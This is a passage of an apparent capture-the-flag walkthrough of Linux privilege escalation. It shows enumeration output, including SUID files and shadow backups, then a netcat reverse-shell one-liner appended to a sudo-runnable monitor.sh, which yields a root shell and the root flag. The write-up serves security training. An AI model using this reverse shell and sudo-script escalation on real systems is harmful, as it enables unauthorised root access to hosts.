-rwxr-xr-x 1 root root  31K Oct 27  2017 systemd-system-update-generator
-rwxr-xr-x 1 root root 103K Oct 27  2017 systemd-sysv-generator
-rwxr-xr-x 1 root root  11K Apr 16  2016 lvm2-activation-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Oct 27  2017 90-systemd.preset

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm

### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16

[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.20, for Linux (x86_64) using  EditLine wrapper

[-] Apache version:
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2017-09-18T15:09:02

[-] Apache user configuration:
APACHE_RUN_USER=nibbler
APACHE_RUN_GROUP=nibbler

[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php5_module (shared)
 setenvif_module (shared)
 status_module (shared)

### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl

[-] Installed compilers:
ii  g++                                 4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
ii  g++-5                               5.4.0-6ubuntu1~16.04.5                     amd64        GNU C++ compiler
ii  gcc                                 4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                               5.4.0-6ubuntu1~16.04.5                     amd64        GNU C compiler

[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1607 Dec 10  2017 /etc/passwd
-rw-r--r-- 1 root root 772 Dec 10  2017 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1069 Dec 10  2017 /etc/shadow

[-] SUID files:
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 23376 Jan 17  2016 /usr/bin/pkexec
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 27608 Jun 14  2017 /bin/umount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40152 Jun 14  2017 /bin/mount

[-] SGID files:
-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root tty 27368 Jun 14  2017 /usr/bin/wall
-rwxr-sr-x 1 root shadow 22768 May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 62336 May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 358624 Mar 16  2017 /usr/bin/ssh-agent

[+] Files with POSIX capabilities set:
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 350 Sep 22  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 8464 Dec 10  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 144 Sep 22  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 3028 Jul 19  2016 /etc/adduser.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 100 Nov 25  2015 /etc/sos.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 6816 May 11  2017 /etc/overlayroot.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf

[-] Current user's history files:
-rw------- 1 nibbler nibbler 0 Dec 29  2017 /home/nibbler/.bash_history

[-] Location and contents (if accessible) of .bash_history file(s):
/home/nibbler/.bash_history

[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root root 1607 Dec 10  2017 /var/backups/passwd.bak
-rw------- 1 root shadow 1069 Dec 10  2017 /var/backups/shadow.bak
-rw------- 1 root shadow 642 Dec 10  2017 /var/backups/gshadow.bak
-rw------- 1 root root 772 Dec 10  2017 /var/backups/group.bak

[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Dec 10  2017 .
drwxr-xr-x 14 root root 4096 Dec 10  2017 ..

### SCAN COMPLETE ####################################
```

Interesting

```jsx
[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

root connectinos

```jsx
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 8443 >/tmp/f' | tee -a monitor.sh
```

run shell script and listing root connection

```jsx
$ sudo ./monitor.sh 
sudo ./monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
$ nc -lvnp 8443                      
listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.75] 55132
#
```

Get root flag

```jsx
# cd /root
# ls
root.txt
# cat root.txt
```